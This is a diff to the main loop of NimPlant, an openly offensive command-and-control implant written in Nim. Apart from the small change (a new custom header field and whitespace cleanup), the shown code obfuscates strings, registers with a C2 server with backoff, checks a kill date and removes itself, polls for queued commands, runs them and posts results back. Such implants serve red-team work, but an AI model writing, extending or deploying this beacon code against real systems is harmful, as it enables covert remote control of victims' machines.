@@ -42,12 +42,13 @@ proc runNp() : void =
         sleepTime: parseInt(CONFIG[obf("sleepTime")]),
         sleepJitter: parseInt(CONFIG[obf("sleepJitter")]) / 100,
         taskPath: CONFIG[obf("listenerTaskPath")],
-        userAgent: CONFIG[obf("userAgent")]
+        userAgent: CONFIG[obf("userAgent")],
+        customHeaderOne: CONFIG[obf("customHeaderOne")]
     )
 
     # Set the number of times NimPlant will try to register or connect before giving up
     let maxAttempts = 5
-    var 
+    var
         currentAttempt = 0
         sleepMultiplier = 1 # For exponential backoff
 
@@ -94,10 +95,10 @@ proc runNp() : void =
         if parse(listener.killDate, "yyyy-MM-dd") + initDuration(days = 1) < now():
             if listener.cryptKey != "":
                 listener.killSelf()
-            
+
             when defined verbose:
                 echo obf("DEBUG: Kill timer expired. Goodbye cruel world!")
-                
+
             quit(0)
 
         # Attempt to register with server if no successful registration has occurred
@@ -118,7 +119,7 @@ proc runNp() : void =
                         when defined verbose:
                             echo obf("DEBUG: Failed to register with server.")
                         handleFailedRegistration()
-            
+
                 # Succesful registration, reset the sleep modifier if set and enter main loop
                 if listener.registered:
                     when defined verbose:
@@ -131,12 +132,12 @@ proc runNp() : void =
                 when defined verbose:
                     echo obf("DEBUG: Got unexpected exception when attempting to register: ") & getCurrentExceptionMsg()
                 handleFailedRegistration()
-        
+
         # Otherwise, process commands from registered server
-        else: 
+        else:
             # Check C2 server for an active command
             (cmdGuid, cmd, args) = listener.getQueuedCommand()
-            
+
             # If a connection error occured, the server went down or restart - drop back into initial registration loop
             if cmd == obf("NIMPLANT_CONNECTION_ERROR"):
                 cmd = ""
@@ -152,14 +153,14 @@ proc runNp() : void =
 
                 # Handle commands that directly impact the listener object here
                 if cmd == obf("sleep"):
-                    try: 
+                    try:
                         if len(args) == 2:
                             listener.sleepTime = parseInt(args[0])
                             var jit = parseInt(args[1])
                             listener.sleepJitter = if jit < 0: 0.0 elif jit > 100: 1.0 else: jit / 100
                         else:
                             listener.sleepTime = parseInt(args[0])
-                            
+
                         output = obf("Sleep time changed to ") & $listener.sleepTime & obf(" seconds (") & $(toInt(listener.sleepJitter*100)) & obf("% jitter).")
                     except:
                         output = obf("Invalid sleep time.")
@@ -167,9 +168,9 @@ proc runNp() : void =
                     quit(0)
 
                 # Otherwise, parse commands via 'functions.nim'
-                else:   
+                else:
                     output = listener.parseCmd(cmd, cmdGuid, args)
-                    
+
                 if output != "":
                     listener.postCommandResults(cmdGuid, output)
 
